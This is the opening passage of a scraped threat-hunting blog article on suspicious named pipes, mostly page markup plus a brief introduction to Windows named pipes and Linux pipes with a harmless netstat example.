# https://detect.fyi/threat-hunting-suspicious-named-pipes-a4206e8a4bc8

<!DOCTYPE html><html lang="en" data-rh="lang"><body><div id="root"><div class="a b c"><a href="https://detect.fyi/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="d"><a rel="me" href="https://infosec.exchange/@mthcht">Mastodon</a></div><div class="m"><div><div class="gn bi m"><div class="go bi gp"></div><div class="ac ci"><div class="cj ck cl cm cn gq cp bi"><div class="af ac r"><div class="gr gs gt gu gv m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://detect.fyi/?source=post_page---publication_nav-d5fd8f494f6a-a4206e8a4bc8---------------------------------------" rel="noopener follow"><h2 class="bg gw gx ef gy gz eh ha hb hc hd he hf hg hh hi hj bl"><div class="gl ga gm gc">Detect FYI</div></h2></a></div><div class="t v k j e"><span class="hk hl" aria-hidden="true"><span class="bg b hm hn bl">·</span></span><p class="bg b hm hn bl"><button class="ah ai aj fo al am an ao ap aq ar as at qr">Follow publication</button></p></div></div></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="vw" role="dialog" aria-modal="true" tabindex="-1"><div class="yf yg bi ed yh yi yj aq ht ho yk" aria-hidden="true" role="presentation"></div><div class="yl yh ym yn yo yf ed fk yp yq yr nc ys yt yu yv yw yx yy yz za zb ac cv zc" aria-hidden="true"><div class="zd ip"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="ho fw hp hq o hr hs nc ze"><div class="ac ci"><div class="cj ck cl cm cn gq cp bi"><div class="hv m"><div class="zf"><div class="ac cu cv"><a href="https://detect.fyi/?source=post_page---post_publication_sidebar-d5fd8f494f6a-a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m hy hx" width="38" height="38" loading="lazy" src="https://miro.medium.com/v2/resize:fill:38:38/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m hx hy fw o gj hz"></div></div></a><div class="ia m"></div><p class="bg b bh ab eb"><span class="ib">Threat Detection Engineering and DFIR Insights</span></p><div class="ia m"></div><p class="bg b bh ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at qr">Follow publication</button></p></div></div></div></div></div></div><div class="ic id ie if ig m"><div class="ac ci"><div class="cp bi ih ii ij ik"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw iq zg is it ho"></div><div class="speechify-ignore oh oi rd fr i l k j cc"></div><div class="ib iu iv iw ix"><div class="ac ci"><div class="cp bi ih ii ij ik"><div><h1 id="7dd8" class="pw-post-title iy iz ja bg jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka bl" data-testid="storyTitle" data-selectable-paragraph="">Threat Hunting - Suspicious Named pipes</h1><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac kb kc kd ke kf kg kh ki kj kk kl"><div class="ac r kl"><div class="ac km"><div><div class="bn" role="tooltip" aria-describedby="2" aria-labelledby="2"><div tabindex="-1" class="bf"><a href="https://mthcht.medium.com/?source=post_page---byline--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m kn ko by kp kq"><div class="m fr"><img alt="mthcht" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*h7dUyUQgUIrGSCgdizGKYw.png"><div class="kr by m bz ca fw o ks gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="kt ac r"><div class="ac r ku"><div class="ac r"><div><div class="bn" role="tooltip" aria-describedby="3" aria-labelledby="3"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at kv" data-testid="authorName" href="https://mthcht.medium.com/?source=post_page---byline--a4206e8a4bc8---------------------------------------" rel="noopener follow">mthcht</a></span></div></div></div></div><div class="kw bn"></div><button class="ya yb aq ac ci r abd abe abf" style="border: 1px solid rgba(16, 16, 16, 0.435);"><span class="bg b bh ab bl bi"><span class="bn ye">Follow</span></span></button></div></div></span></div><div class="ac r kx"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">20 min read</span><div class="ky kz m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">Jul 21, 2024</span></div></span></div></div><div class="ac cw la lb lc ld le lf lg lh li lj lk ll lm ln lo lp"><div class="i l x fp fq r"><div class="mf m"><div class="ac r mg mh"><div class="pw-multi-vote-icon fr mi mj mk ml"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fdetect-fyi%2Fa4206e8a4bc8&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;user=mthcht&amp;userId=104861307c56&amp;source=---header_actions--a4206e8a4bc8---------------------clap_footer------------------" rel="noopener follow"><div><div class="bn" role="tooltip" aria-describedby="4" aria-labelledby="4"><div tabindex="-1" class="bf"><div class="mm aq mn mo mp mq ao mr ms mt ml" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m mu mv mw mx my mz na"><div><div class="bn" aria-describedby="71" aria-labelledby="71" role="tooltip"><div tabindex="-1" class="bf"><p class="bg b ec ab eb"><button class="ah ai aj fo al am an ao ap aq ar as at au av abg ni">190<span class="m i h g wb wc"></span></button></p></div></div></div></div></div></div><div><div class="bn" role="tooltip" aria-describedby="5" aria-labelledby="5"><div tabindex="-1" class="bf"><button class="aq mm nc nd ac r fs ne nf" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ng"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div><div class="ac r lq lr ls lt lu lv lw lx ly lz ma mb mc md me"><div class="nh l k j e"></div><div class="i l"><div><div class="bn" role="tooltip" aria-describedby="6" aria-labelledby="6"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fa4206e8a4bc8&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;source=---header_actions--a4206e8a4bc8---------------------bookmark_footer------------------" rel="noopener follow"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk nj cu"><div class="m ag"><div class="ac ci"><div class="nk nl nm nn no gl cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Da4206e8a4bc8&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;source=---header_actions--a4206e8a4bc8---------------------post_audio_button------------------" rel="noopener follow"><div><div class="bn" aria-describedby="23" aria-labelledby="23" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an np ap aq ar fe nq nr nf ns nt nu nv nw t nx ny nz oa ob oc od v oe of og"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" role="tooltip" aria-describedby="8" aria-labelledby="8"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an np ap aq ar fe nq nr nf ns nt nu nv nw t nx ny nz oa ob oc od v oe of og"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><figure class="ok ol om on oo op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi oj"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CBnmH3wjh6joy7_UKLr61Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*CBnmH3wjh6joy7_UKLr61Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*CBnmH3wjh6joy7_UKLr61Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*CBnmH3wjh6joy7_UKLr61Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*CBnmH3wjh6joy7_UKLr61Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*CBnmH3wjh6joy7_UKLr61Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*CBnmH3wjh6joy7_UKLr61Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*CBnmH3wjh6joy7_UKLr61Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi gl ou c" width="700" height="379" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*CBnmH3wjh6joy7_UKLr61Q.png"></picture></div></div></figure><p id="f82f" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">simulation and detection</p><h2 id="25ee" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">What are Named Pipes?</h2><p id="17e2" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Named pipes are a mechanism for inter-process communication (IPC) in Windows operating systems. They enable <strong class="ox jb">processes to communicate with each other</strong>, <strong class="ox jb">either on the same machine or over a network</strong>, by providing a reliable way to transfer data between applications. Named pipes facilitate bidirectional communication and can handle multiple client connections simultaneously. In contrast, in Linux, we have two types of pipes: pipes (also known as anonymous or unnamed pipes) and <a class="ah qr" href="https://man7.org/linux/man-pages/man7/fifo.7.html" rel="noopener ugc nofollow" target="_blank">FIFO’s</a> (also known as named pipes)</p><h2 id="5b45" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">How Pipes Work on Linux</h2><p id="2e0d" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Pipes</strong> in Linux connect commands, allowing the output of one command to be used as the input for another, creating a pipeline. For example <code class="de qs qt qu qv b">netstat -tlpn | grep 127.0.0.1</code> filters network connections to localhost, and <code class="de qs qt qu qv b">netstat -tlpn |&amp; grep 127.0.0.1</code> merges and filters both standard output and error.</p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div class="oh oi qw"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*pQYzUHoS-x7G2Fto.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*pQYzUHoS-x7G2Fto.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*pQYzUHoS-x7G2Fto.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*pQYzUHoS-x7G2Fto.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*pQYzUHoS-x7G2Fto.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*pQYzUHoS-x7G2Fto.png 1100w, https://miro.medium.com/v2/resize:fit:1384/format:webp/0*pQYzUHoS-x7G2Fto.png 1384w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 